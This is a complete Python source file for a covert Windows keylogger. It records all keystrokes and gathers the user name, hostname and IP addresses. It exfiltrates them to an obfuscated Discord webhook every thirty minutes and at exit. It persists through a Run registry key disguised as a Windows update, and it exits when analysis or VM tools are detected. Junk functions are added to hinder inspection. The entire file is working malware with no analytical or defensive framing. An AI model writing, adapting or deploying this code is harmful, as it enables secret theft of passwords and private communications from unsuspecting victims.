import os
import sys
import platform
import time
import threading
import requests
from pynput import keyboard
import ctypes
import shutil
import winreg
import atexit
import tempfile
import base64
import socket
import subprocess
ENCODED_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzNDU2Nzg5MC9hYmNkZWZn"
DISCORD_WEBHOOK = base64.b64decode(ENCODED_WEBHOOK).decode()
SEND_INTERVAL_SECONDS = 1800
keylog_buffer = []
buffer_lock = threading.Lock()
mutex = None
listener = None

def dummy_math():
    try:
        x = sum(ord(c) for c in platform.node())
        _ = (x * 42) % 97
    except: pass

def fake_validation():
    try:
        _ = ctypes.windll.kernel32.GetTickCount64() ^ 0xABCDEF
    except: pass

def useless_loop():
    for _ in range(3):
        try:
            [i**2 for i in range(1000) if i % 7 == 0]
        except: pass

def detect_vm_or_analysis():
    suspicious_processes = ["wireshark.exe", "procmon.exe", "VBoxService.exe", "vmtoolsd.exe"]
    try:
        tasks = subprocess.check_output("tasklist", shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode(errors="ignore").lower()
        for proc in suspicious_processes:
            if proc.lower() in tasks:
                sys.exit(0)
    except:
        pass

def get_system_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        username = os.getlogin()
        public_ip = "Không xác định"
        try:
            public_ip = requests.get("https://api.ipify.org", timeout=5).text
        except:
            pass
        return f"User: {username}\nHostname: {hostname}\nLocal IP: {local_ip}\nPublic IP: {public_ip}\n"
    except:
        return "User/Hostname/IP: Không xác định\n"

def ensure_single_instance():
    global mutex
    mutex_name = "Global\\WMIStatusCheck"
    mutex = ctypes.windll.kernel32.CreateMutexA(None, False, mutex_name.encode())
    last_error = ctypes.windll.kernel32.GetLastError()
    if last_error == 183:
        return False
    return True

def add_to_startup():
    try:
        if not getattr(sys, 'frozen', False):
            return False
        current_path = sys.executable
        appdata = os.environ.get('APPDATA')
        hidden_folder = os.path.join(appdata, "SystemService")
        os.makedirs(hidden_folder, exist_ok=True)
        target_path = os.path.join(hidden_folder, "winupdate.exe")
        if not os.path.exists(target_path) or not os.path.samefile(current_path, target_path):
            shutil.copy2(current_path, target_path)
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "WindowsSystemUpdate", 0, winreg.REG_SZ, target_path)
        winreg.CloseKey(key)
        return True
    except:
        return False

def log_key_to_memory(key_data):
    with buffer_lock:
        keylog_buffer.append(key_data)

def send_log_to_discord():
    global keylog_buffer
    with buffer_lock:
        if not keylog_buffer:
            return
        content = ''.join(keylog_buffer)
        if len(content.strip()) == 0:
            return
        try:
            sys_info = get_system_info()
            full_content = sys_info + content
            encoded_content = base64.b64encode(full_content.encode('utf-8')).decode('utf-8')
            with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".txt", encoding="utf-8") as tmp:
                tmp.write(encoded_content)
                tmp_path = tmp.name
            with open(tmp_path, "rb") as f:
                files = {"file": ("keylog_base64.txt", f)}
                requests.post(DISCORD_WEBHOOK, files=files)
        except:
            pass
        finally:
            keylog_buffer = []
            try:
                os.remove(tmp_path)
            except:
                pass

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char:
            log_key_to_memory(key.char)
        else:
            special_key = str(key).replace("Key.", "")
            log_key_to_memory(f"[{special_key}]")
    except:
        pass

def periodic_send():
    dummy_math()
    fake_validation()
    useless_loop()
    send_log_to_discord()
    if listener and listener.running:
        timer = threading.Timer(SEND_INTERVAL_SECONDS, periodic_send)
        timer.daemon = True
        timer.start()

def on_exit():
    send_log_to_discord()

if __name__ == "__main__":
    if platform.system() != "Windows":
        sys.exit(0)
    detect_vm_or_analysis()
    dummy_math()
    fake_validation()
    useless_loop()
    if not ensure_single_instance():
        sys.exit(0)
    atexit.register(on_exit)
    if getattr(sys, 'frozen', False):
        add_to_startup()
    try:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        periodic_send()
        while listener.is_alive():
            time.sleep(1)
    except:
        sys.exit(1)
